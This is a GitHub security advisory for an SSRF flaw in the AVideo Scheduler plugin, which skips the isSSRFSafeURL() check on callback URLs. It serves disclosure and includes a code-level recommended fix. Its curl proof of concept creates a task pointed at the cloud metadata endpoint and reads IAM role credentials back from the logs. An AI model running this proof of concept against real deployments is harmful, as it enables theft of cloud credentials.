# [M] AVideo has SSRF in Scheduler Plugin via callbackURL Missing `isSSRFSafeURL()` Validation

## Summary
Severity: Medium
Advisory: GHSA-v467-g7g7-hhfh
CVE: CVE-2026-33237
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-v467-g7g7-hhfh
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0 <26.0

## Details
## Summary

The Scheduler plugin's `run()` function in `plugin/Scheduler/Scheduler.php` calls `url_get_contents()` with an admin-configurable `callbackURL` that is validated only by `isValidURL()` (URL format check). Unlike other AVideo endpoints that were recently patched for SSRF (GHSA-9x67-f2v7-63rw, GHSA-h39h-7cvg-q7j6), the Scheduler's callback URL is never passed through `isSSRFSafeURL()`, which blocks requests to RFC-1918 private addresses, loopback, and cloud metadata endpoints. An admin can configure a scheduled task with an internal network `callbackURL` to perform SSRF against cloud infrastructure metadata services or internal APIs not otherwise reachable from the internet.

## Details

The vulnerable code is at `plugin/Scheduler/Scheduler.php:157-166`:

```php
// Line 157: callback URL retrieved and site-root token substituted
$callBackURL = $e->getCallbackURL();
$callBackURL = str_replace('$SITE_ROOT_TOKEN', $global['webSiteRootURL'], $callBackURL);
if (!isValidURL($callBackURL)) {
    return false;
}
// isValidURL() only checks URL format via filter_var(..., FILTER_VALIDATE_URL)
// The critical missing check is:
// if (!isSSRFSafeURL($callBackURL)) { return false; }
if (empty($_executeSchelude[$callBackURL])) {
    $_executeSchelude[$callBackURL] = url_get_contents($callBackURL, '', 30);
```

`isValidURL()` in `objects/functions.php` uses `filter_var($url, FILTER_VALIDATE_URL)` — it validates URL syntax only and does not block internal/private network targets.

`isSSRFSafeURL()` in `objects/functions.php:4021` explicitly blocks:
- `127.x.x.x` / `::1` (loopback)
- `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x` (RFC-1918 private)
- `169.254.x.x` (link-local, including AWS/GCP metadata at `169.254.169.254`)
- IPv6 private ranges

This function was added to the LiveLinks proxy (GHSA-9x67-f2v7-63rw fix, commit `0e5638292`) and was previously used in the aVideoEncoder download flow (GHSA-h39h-7cvg-q7j6), but the Scheduler plugin was not updated in either fix wave, leaving it as an incomplete patch.

An admin can configure the `callbackURL` for a scheduled task via the Scheduler plugin UI and trigger execution immediately via the "Run now" interface.

## PoC

```bash
# Step 1: Authenticate as admin

# Step 2: Create a scheduled task with cloud metadata SSRF callback
curl -b "admin_session=<session>" -X POST \
  https://target.avideo.site/plugin/Scheduler/View/Scheduler_commands/add.json.php \
  -d "callbackURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/&status=a&type=&date_to_execute=2026-03-18+12:00:00"

# Step 3: Trigger immediate execution via Scheduler run endpoint
curl -b "admin_session=<session>" \
  https://target.avideo.site/plugin/Scheduler/run.php

# Step 4: Read the scheduler execution logs
curl -b "admin_session=<session>" \
  https://target.avideo.site/plugin/Scheduler/View/Scheduler_commands/get.json.php
# Response includes the AWS metadata API response with IAM role credentials
```

**Expected:** Internal network addresses rejected before HTTP request is made.
**Actual:** The server makes an HTTP request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and the response (including AWS IAM role credentials) is stored in the scheduler execution log.

## Impact

- **Cloud credential theft:** On AWS, GCP, or Azure deployments, the attacker can retrieve IAM instance role credentials from the cloud metadata service (`169.254.169.254`), potentially enabling privilege escalation within the cloud environment.
- **Internal service probing:** The attacker can make the server issue requests to internal APIs, microservices, or databases with HTTP interfaces not exposed to the internet.
- **Incomplete patch amplification:** The fix for GHSA-9x67-f2v7-63rw and GHSA-h39h-7cvg-q7j6 added `isSSRFSafeURL()` to specific call sites but not the Scheduler. Deployments that updated expecting comprehensive SSRF protection remain vulnerable via this path.
- **Blast radius:** Requires admin access. Impact is significant in cloud-hosted deployments where instance metadata credentials unlock broader infrastructure access.

## Recommended Fix

Add `isSSRFSafeURL()` validation to the Scheduler callback URL before `url_get_contents()` is called, consistent with the existing SSRF fixes in `plugin/LiveLinks/proxy.php` and `objects/aVideoEncoder.json.php`:

```php
$callBackURL = $e->getCallbackURL();
if (!isValidURL($callBackURL)) {
    return false;
}
// Add this SSRF check — same pattern as LiveLinks proxy fix (GHSA-9x67-f2v7-63rw):
if (!isSSRFSafeURL($callBackURL)) {
    _error_log("Scheduler::run SSRF protection blocked callbackURL: " . $callBackURL);
    return false;
}
if (empty($_executeSchelude[$callBackURL])) {
    $_executeSchelude[$callBackURL] = url_get_contents($callBackURL, '', 30);
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-v467-g7g7-hhfh
- https://nvd.nist.gov/vuln/detail/CVE-2026-33237
- https://github.com/WWBN/AVideo/issues/10403
- https://github.com/WWBN/AVideo/commit/df926e500580c2a1e3c70351f0c30f4e15c0fd83
- https://github.com/WWBN/AVideo
